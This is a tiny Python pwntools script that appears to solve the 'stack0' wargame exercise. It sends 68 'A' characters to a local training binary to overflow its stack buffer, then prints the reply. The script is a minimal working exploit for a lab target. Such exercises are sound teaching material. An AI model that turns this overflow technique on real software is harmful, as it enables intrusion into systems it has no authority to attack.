from pwn import *

r = process("./stack0",aslr=True)

r.sendline("A"*68)
s=r.recvline()
print s

